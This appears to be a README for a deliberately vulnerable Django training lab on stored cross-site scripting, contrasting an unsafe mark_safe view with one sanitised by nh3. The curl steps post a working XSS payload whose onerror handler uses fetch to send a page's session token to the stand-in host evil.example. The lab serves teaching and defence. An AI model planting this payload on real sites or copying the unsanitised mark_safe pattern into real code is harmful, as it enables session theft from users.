# Lab 02 — Cross-Site Scripting (XSS)

Companion lab for the blog post
**[Cross-Site Scripting (XSS): Stored, Reflected and DOM-Based Attacks — and Why mark_safe and Unsafe Markdown Are Equally Dangerous](https://thiagoteixeira.tech/blog/cross-site-scripting-xss-stored-reflected-dom-based-attacks-mark-safe-unsafe-markdown/)**.

| | |
|---|---|
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-79 — Improper Neutralization of Input During Web Page Generation |
| **ASVS** | V5.3.3 — context-aware output encoding / sanitisation |
| **Detection** | SAST scanned, **not asserted** (see below) · gate is `tests.py` |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The two views

| View | File | What it does |
|---|---|---|
| Vulnerable | [`views_vulnerable.py`](views_vulnerable.py) | `mark_safe(c.body)` — marks untrusted comment HTML safe with no sanitiser |
| Secure | [`views_secure.py`](views_secure.py) | `mark_safe(nh3.clean(c.body))` — allowlist-sanitises first, then marks safe |

Both expose the same stored-comment board. Each renders its comments through
[`autoescape.as_html`](autoescape.py), a three-line stand-in for Django template
autoescaping: it escapes every value **unless** the value is a `SafeString`
(what `mark_safe()` produces). So `mark_safe()` is the operative mistake here
exactly as it would be in a template — drop it and the same body is escaped and
harmless. The page also shows a `session-token` value (from the `xss_flag`
table): data the page holds for its own user, which the comment feature should
never be able to hand to anyone else.

## Run it

```bash
docker compose up            # Postgres + Django on http://127.0.0.1:8000
```

Everything below is `curl` against that stack — no browser needed.

## Test the pair from the command line

**1. Post the attacker's comment to the vulnerable board.** The payload is an
image whose broken-load handler reads the session token out of the page:

```bash
curl -s -X POST 'http://127.0.0.1:8000/xss/vulnerable/' \
     --data-urlencode 'author=mallory' \
     --data-urlencode "body=<img src=x onerror=\"fetch('https://evil.example/?c='+document.getElementById('session-token').textContent)\">"
```

**2. Read the vulnerable board back.** The comment comes back as **live markup** —
a real `<img>` tag with its `onerror` intact. In a browser it would fire on load
and exfiltrate the token; that it reached the page unescaped is the whole bug:

```bash
curl -s 'http://127.0.0.1:8000/xss/vulnerable/' | grep -o '<img src=x onerror=[^>]*>'
# <img src=x onerror="fetch('https://evil.example/?c='+document.getElementById('session-token').textContent)">
```

**3. Read the *same* comment on the secure board.** `nh3` stripped the event
handler before the value was ever marked safe, so what is left is inert:

```bash
curl -s 'http://127.0.0.1:8000/xss/secure/' | grep -o '<strong>mallory</strong>: <img[^>]*>'
# <strong>mallory</strong>: <img src="x">
```

```bash
curl -s 'http://127.0.0.1:8000/xss/secure/' | grep -c onerror
# 0
```

**4. Confirm the fix did not just escape everything.** A legitimate `<strong>`
in a seeded comment still renders on the secure board — the fix *sanitises* rich
text, it does not flatten it:

```bash
curl -s 'http://127.0.0.1:8000/xss/secure/' | grep -o 'Works for me on <strong>[^<]*</strong>'
# Works for me on <strong>Django 5.2</strong>
```

Or prove all of it in one command:

```bash
docker compose run --rm web python manage.py test labs.post_02_xss
```

> **Why `curl`, not a browser.** You do not need to watch the script *fire* to
> prove the bug — you only need to see that executable markup reached the page on
> one view and was neutralised on the other, which `grep` shows plainly. A
> browser is the *victim's* environment, not the test harness.

## The fix

`nh3` is an allowlist sanitiser (Rust/Ammonia bindings). Given untrusted HTML it
keeps a known-safe set of tags and attributes and drops everything else — the
event-handler attributes (`onerror`, `onload`, …) and unsafe URL schemes
(`javascript:`, `data:`) that carry XSS. Only sanitised output is marked safe:

```python
import nh3
from django.utils.safestring import mark_safe

safe_html = mark_safe(nh3.clean(comment.body))
```

The invariant: **never `mark_safe()` a value that touched user input unless it
has been through an allowlist sanitiser first.** Autoescaping covers plain
`{{ value }}`; the moment you turn it off with `mark_safe`, the `|safe` filter,
or `{% autoescape off %}`, sanitising is your job.

## Isolation

This lab teaches XSS and nothing else. The comment `author` is escaped, so the
only injection point is the `body` via `mark_safe`; there is no raw SQL near the
comment store; and the board takes its input by POST without a form, so the lab
does not drift into CSRF (that is Post 8).

## Scanning it

The standard SAST tools do **not** cleanly separate the bug from the fix here —
Bandit flags `mark_safe()` on **both** views (it cannot see the `nh3.clean()`
inside the secure one), and the Semgrep community rules report **neither**. So
this lab carries no SAST scan-assert in CI, and its gate is `tests.py`. The full
reasoning and the captured runs are in [`scans/`](scans/):

```bash
bandit -r labs/post_02_xss/
semgrep scan --config p/django --config p/python --config p/owasp-top-ten labs/post_02_xss/
```

A lab whose class the standard tools do not cleanly catch is an expected outcome
of the detection pass, not a defect — and itself a lesson about where SAST ends.
